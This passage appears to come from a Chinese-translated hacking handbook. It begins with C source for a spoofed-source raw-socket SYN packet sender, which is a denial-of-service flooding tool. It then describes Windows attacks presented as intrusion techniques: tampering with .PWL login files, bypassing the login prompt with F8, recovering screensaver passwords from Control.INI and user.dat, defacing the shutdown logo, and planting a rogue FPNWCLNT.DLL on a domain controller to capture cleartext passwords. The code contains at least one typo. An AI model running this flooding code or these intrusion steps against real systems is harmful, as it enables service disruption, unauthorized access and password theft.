
```c
        printf("Being Synful to %s at port %u from %s port %u\n", argv[1],
        port, tmpsrchost, random_port);
        srchost = host2ip(tmpsrchost);
        dosynpacket(srchost, dsthost, port, random_port);
    }
}
void dosynpacket(unsigned int source_addr, unsigned int dest_addr,
    unsigned short short_dest_port, unsigned short ran_port) {
    struct send_tcp
    {
        struct iphdr ip;
        struct tcphdr tcp;
    } send_tcp;
    struct pseudo_header
    {
        unsigned int source_address;
        unsigned int dest_address;
        unsigned char placeholder;
        unsigned char protocol;
        unsigned short tcp_length;
        struct tcphdr tcp;
    } pseudo_header;
    int tcp_socket;
    struct sockaddr_in sin;
    int sinlen;
    send_tcp.ip.ihl = 5;
    send_tcp.ip.version = 4;
    send_tcp.ip.tos = 0;
    send_tcp.ip.tot_len = htons(40);
    send_tcp.ip.id = ran_port;
    send_tcp.ip.frag_off = 0;
    send_tcp.ip.ttl = 255;
    send_tcp.ip.protocol = IPPROTO_TCP;
    send_tcp.ip.check = 0;
    send_tcp.ip.saddr = source_addr;
    send_tcp.ip.daddr = dest_addr;
    send_tcp.tcp.source = ran_port;
    send_tcp.tcp.dest = htons(dest_port);
    send_tcp.tcp.seq = ran_port;
    send_tcp.tcp.ack_seq = 0;
    send_tcp.tcp.res1 = 0;
    send_tcp.tcp.doff = 5;
    send_tcp.tcp.fin = 0;
    send_tcp.tcp.syn = 1;
    send_tcp.tcp.rst = 0;
    send_tcp.tcp.psh = 0;
    send_tcp.tcp.ack = 0;
    send_tcp.tcp.urg = 0;
    send_tcp.tcp.res2 = 0;
    send_tcp.tcp.window = htons(512);
    send_tcp.tcp.check = 0;
    send_tcp.tcp.urg_ptr = 0;
    sin.sin_family = AF_INET;
    sin.sin_port = send_tcp.tcp.source;
    sin.sin_addr.s_addr = send_tcp.ip.daddr;
    tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(tcp_socket < 0)
    {
        perror("socket");
        exit(1);
    }
    send_tcp.tcp.source++; send_tcp.ip.id++; send_tcp.tcp.seq++;
    send_tcp.tcp.check = 0; send_tcp.ip.check = 0;
    send_tcp.ip.check = in_cksum((unsigned short *) &send_tcp.ip, 20);
    pseudo_header.source_address = send_tcp.ip.saddr;
    pseudo_header.dest_address = send_tcp.ip.daddr;
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_TCP;
    pseudo_header.tcp_length = htons(20);
    bcopy((char *) &send_tcp.tcp, (char *) &pseudo_header.tcp, 20);
    send_tcp.tcp.check = in_cksum((unsigned short *) &pseudo_header, 32);
    sinlen = sizeof(sin);
    sendto(tcp_socket, &send_tcp, 40, 0, (struct sockaddr *) &sin, sinlen);
    close(tcp_socket);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long    sum;      /* assumes long == 32 bits */
    u_short      oddbyte;
    register u_shortanswer;        /* assumes u_short == 16 bits */
    sum = 0;
    while (nbytes > 1)  {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;      /* make sure top half is zero */
        *((u_char *) &oddbyte) = *((u_char *)ptr);  /* one byte only */
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);  /* add high-16 to low-16 */
    sum += (sum >> 16);     /* add carry */
    answer = ~sum;    /* ones-complement, then truncate to 16 bits */
    return(answer);
}

unsigned int host2ip(char *hostname)
{
    static struct in_addr i;
    struct hostent  *h;
    i.s_addr = inet_addr(hostname);
    if(i.s_addr == -1)
    {
        h = gethostbyname (hostname);
        if (h == NULL)
        {
            fprintf (stderr, "cant find %s!\n", hostname);
            exit(0);
        }
        bcopy(h->h_addr,  (char *)&i.s_addr, h->h_length);
    }
    return i.s_addr;
}
void inirand(void)
{
    struct timeval tv;
    gettimeofday(&tv,  (struct timezone *) NULL);
    srand(tv.tv_usec);
}
```

## Microsoft Windows

自1975年以来，比尔·盖茨在其公司微软（[www.microsoft.com](https://www.microsoft.com)）的推动下，监督了领先的Windows操作系统及软件的开发，主要面向个人电脑。经过指数级增长，这些产品如今遍布世界各地的家庭、学校和企业。截至1999年12月31日，微软在全球拥有34,571名员工，其中14,433人从事研发工作。

但Windows开发者一直专注于设计更多功能和系统控制，对安全问题的关注较少。结果是，大多数地下黑客专门针对Windows漏洞发起攻击。因此，本节专门探讨针对Windows系统的黑客攻击，包括3x、9x、9x千禧版、NT和2000版本。

![](img/ba85bb40c695c02adae8cbd6666f2e0c_576_0.png)

> 虽然第8章中复习的许多黑客技术和程序可以应用于Windows操作系统，但本章将探讨专门的技术，从获取访问权限和控制权到引发广泛混乱。

- 弱点
- 密码破解
- 破解系统登录密码

**摘要：** 定位和操纵密码文件可以促进非法登录访问。

**黑客状态：** 未授权访问。

![](img/ba85bb40c695c02adae8cbd6666f2e0c_577_0.png)

**图10.5** 搜索 .PWL 文件。

**漏洞：** Win 3x, 9x。

**入侵：** 最常见的黑客技术之一涉及操纵登录数据文件 `???PWL`，通常位于Windows目录中（见图10.5）。三个问号代表具有系统访问权限并与唯一配置文件关联的特定配置文件的实际登录用户名。

这种特定的入侵在旨在制造混乱的企业环境中很常见。在具有多个配置文件的系统上，攻击者只需将目标文件移动到临时目录，然后使用受害者的用户名（减去密码）登录。此时，数据被删除，桌面设置被修改，等等。当破坏完成后，攻击者恢复USERNAME.PWL文件并注销。攻击者还可以将文件复制到软盘，并使用第8章中描述的任意密码破解工具来破解密码。结果，系统可被远程控制的木马实现所访问，包括网络控制。针对单配置文件系统的替代攻击是，攻击者在启动时按F8绕过登录屏幕的密码提示，然后选择进入MS-DOS（#7）。

### 破解屏幕保护密码

**摘要：** 定位和操纵屏幕保护密码信息可以促进非法登录访问。

**黑客状态：** 未授权访问。

**漏洞：** Win 3x, 9x。

**入侵：** 通过修改与ScreenSaver\_Data字符串关联的数据，黑客可以更改屏幕保护密码以获得对系统的未授权访问。与此破解攻击相关的目标文件是：Win 3x的Control.INI和Win 9x的user.dat（位于/Windows目录中）。密码字符串后面的数据代表未加密ASCII值的十六进制数字。（若要复习十六进制转换，请参阅第6章，“黑客技术手册”。）

受雇于美国企业的黑客喜欢将这种利用更进一步，通过所谓的徽标改造让朋友和同事尴尬。正如所有Windows用户所知，每次Windows启动和关闭时，都会在后台加载和卸载程序和驱动程序的同时显示微软徽标。用户也熟知如何更改系统壁纸。这种特定的攻击涉及定制实际的系统徽标；需要遵循一系列非常简单的步骤：

1. 绕过屏幕保护密码或破解系统登录后，攻击者快速扫描并执行任何图形插图软件包，如Adobe Photoshop或画图。
2. 从插图程序中，攻击者打开“文件类型：所有文件”，并在根 \Windows 目录中查找任何 `logo*.sys` 文件。这是存储启动/关机时显示的微软图形徽标的地方。
3. 此时，攻击者只需修改 `Logow.sys` 文件，使其包含一些恶意短语或图形，然后将文件保存为新的自定义关机徽标。图10.6展示了已选择系统关机徽标。

### 嗅探密码文件

**摘要：** 传输一个伪的 .DLL 可以欺骗性地捕获明文密码。

**黑客状态：** 密码捕获。

**漏洞：** Win NT

**入侵：** 黑客将system32目录中的动态链接库（DLL）文件替换为渗透器，该渗透器以明文捕获来自域控制器的密码。通常在NetWare环境中运行并与注册表项 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` 关联的 `FPNWCLNT`，可以被操纵以与伪的 `FPNWCLNT.DLL` 通信密码（见图10.7）。

编译以下渗透器（FPNWCLNT.C）后，攻击者只需将文件重命名为 .DLL 扩展名，并将文件传输到主要域控制器的根 //system32 目录。代码可以进行修改。

![](img/ba85bb40c695c02adae8cbd6666f2e0c_578_0.png)

**图10.6** Win 9x 关机徽标。

